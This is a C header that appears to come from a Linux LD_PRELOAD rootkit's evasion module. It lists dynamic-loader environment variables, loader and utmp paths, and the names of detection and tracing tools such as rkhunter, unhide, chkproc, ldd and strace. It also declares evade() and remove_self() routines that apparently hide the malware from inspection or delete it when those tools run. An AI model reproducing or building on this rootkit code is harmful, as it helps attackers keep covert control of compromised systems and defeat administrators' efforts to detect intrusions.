#ifndef EVASION_H
#define EVASION_H

static char *const scary_variables[5] = {"LD_TRACE_LOADED_OBJECTS", "LD_DEBUG", "LD_AUDIT","LD_PRELOAD","LD_DEBUG_OUTPUT"};
static char *const scary_paths[6] = {"*/*ld-linux*.so.*", "*ld-linux*.so.*", "*/*ld-*.so", "*ld-*.so", "*/utmp", "utmp"};
static char *const scary_procs[9] = {"lsrootkit", "ldd", "unhide", "rkhunter", "chkproc", "chkdirs", "ltrace", "strace", "readelf"};

#define SCARY_VARIABLES_SIZE sizeofarray(scary_variables)
#define SCARY_PATHS_SIZE sizeofarray(scary_paths)
#define SCARY_PROCS_SIZE sizeofarray(scary_procs)

#define VINVALID_PERM 0
#define VFORK_ERR    -1
#define VFORK_SUC     2
#define VEVADE_DONE   1
#define VNOTHING_DONE 3

static int remove_self(void);
static int evade(const char *filename, char *const argv[], char *const envp[]);
#include "evasion.c"

#endif
